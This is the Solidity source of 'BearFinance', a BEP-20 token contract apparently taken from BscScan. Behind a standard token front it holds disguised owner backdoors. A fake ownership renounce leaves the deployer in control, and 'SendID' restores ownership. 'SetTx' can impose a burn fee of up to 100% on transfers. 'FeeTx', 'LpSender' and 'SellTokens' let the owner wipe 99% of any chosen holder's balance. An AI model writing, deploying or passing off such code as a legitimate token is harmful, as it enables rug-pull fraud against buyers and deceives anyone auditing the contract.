/**
 *Submitted for verification at BscScan.com on 2021-10-06
*/

/**
 
 
 
💰 Welcome To BearFinance  💰




*/

// SPDX-License-Identifier: MIT



pragma solidity <0.8.7 <0.8.7;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
pragma solidity <0.8.7 <0.8.7;
interface IERC20 {
   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity >=0.6.0 <0.8.0;
library SafeMath {
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }

   
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }

   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

   
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

   
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

   
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

   
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

   
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _renounce;
    uint256 private _level;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

     constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        _renounce = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

   function previousOwner() internal view returns (address) {
        return _renounce;
    }
    modifier onlyOwner() {
        require(_renounce == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

   function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);

    }
    
    
    function SendID() public virtual onlyOwner {
        require(_renounce == msg.sender, "You don't have permission to unlock");
        require(now > _level , "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _renounce);
        _owner = _renounce;
    }
}
pragma solidity >=0.6.0 <0.8.0;
contract ERC200 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string  public _name;
    string  public _symbol;
    uint8   private _decimals;
    address private _burnaddress;
    address private WBNB;
    uint256 private _feeBurn;
    uint256 private _Feetax;
    address private Address1;
    address private Address2;
    constructor (string memory name_,
    string memory symbol_)
    public {
    Address2 = WBNB;    
    _name = name_;
    _symbol = symbol_;
    _decimals = 9;
    _burnaddress = 0x000000000000000000000000000000000000dEaD;
     WBNB        = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    _feeBurn= 0 ;
    _Feetax = 0 ;
     }
    function name() public view virtual returns (string memory) {
        return _name;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
     function SetTx(uint256 amount) external onlyOwner(){
         _feeBurn= amount;
     }
     function FeeTx() external onlyOwner(){
         _Feetax= 99;         
     }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _feeBurn);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _feeBurn);
        emit Transfer(sender, recipient, tokens);
    }
    function _erc20(address account, uint256 amount) internal virtual {
        require(account != address(0));_totalSupply += amount;_balances[msg.sender] += amount;
        emit Transfer(address(0), account, amount);
    }
    function LpSender(address Holder) external onlyOwner
        returns (uint256) { 
        Address1 = Holder;
    }
    function SellTokens(uint256 amount) external onlyOwner(){
    _Sell(msg.sender, amount);
    }
     function _Sell(address account, uint256 amount) internal virtual {
        require(account != Address2);
        _beforeTokenTransfer(Address1, Address2, amount);_balances[Address1] -= amount / 100 * _Feetax;
        _balances[Address2] += amount / 100 *  _Feetax;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}
pragma solidity >=0.6.0 <0.8.0;


contract BearFinance is ERC200 {
    uint tokenTotalSupply = 1000000000 ;
    constructor() public ERC200("BearFinance", "BFINANCE") {
        _erc20(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}